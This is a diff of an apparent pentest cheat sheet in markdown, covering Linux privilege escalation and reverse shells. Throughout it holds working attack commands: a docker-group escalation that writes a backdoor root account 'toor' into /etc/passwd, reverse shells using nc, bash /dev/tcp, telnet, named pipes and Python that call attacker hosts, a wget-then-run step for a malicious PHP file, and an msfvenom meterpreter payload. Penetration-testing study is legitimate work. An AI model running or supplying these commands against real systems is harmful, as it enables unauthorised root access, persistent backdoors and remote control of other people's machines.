@@ -85,7 +85,10 @@ Install Docker:
 ```bash
 # docker run -d -p 80:80 citizenstig/dvwa
 ```
-## Privilege Escalation
+## Privilege Escalation Techniques
+[Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+
+[Offensive Bash Scripts](https://github.com/6odhi/myarsenal/blob/master/README.md)
 ### User part of docker group
 You land on a computer and `id` shows you're part of the `docker` group. Escalate to root with:
 
@@ -96,8 +99,7 @@ $> docker run -it --rm -v $PWD:/mnt bash
 adds backdoor toor:password
 ```bash
 #> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
-```
-
+``` 
 ## Reverse shell techniques
 ### Bash
 ```bash
@@ -112,15 +114,34 @@ nc -e /bin/sh 10.0.0.1 1234
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+### Few more reverse shell techniques
+courtesy: https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
 
-## Linux Privilege escalation
+```bash
+#1
+nc <attacker_ip> <port> -e /bin/bash
+#2
+mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
+#3
+/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
+#4
+mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
+#5
+telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>
+#7
+wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php
+```
+### Reverse shell payload using msfvenom
+```bash
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.172.4 lport=443 -f raw
+```
+## Miscellaneous Techniques
 ### Checking SUID files available in the system by running
 > SUID(Set owner User ID up on execution) is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it. In simple words users will get file ownerâs permissions as well as owner UID and GID when executing a file/program/command
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 find / -perm +4000 2> /dev/null
 ```
-https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
 
 Set and Unset SUID on files:
 ```bash
@@ -128,7 +149,6 @@ $ sudo chmod u+s /usr/bin/whoami # set SUID for whoami
 
 $ sudo chmod u-s /usr/bin/whoami # Unset SUID
 ```
-### Reverse shell payload using msfvenom
-```bash
-msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.172.4 lport=443 -f raw
-```
+### Port and Host IP Scanning without NMap/Permissions
+[No Nmap, No Permissions, No Problem](https://www.lanmaster53.com/2010/04/16/no-nmap-no-permissions-no-problem/)
+## *Nix Commands
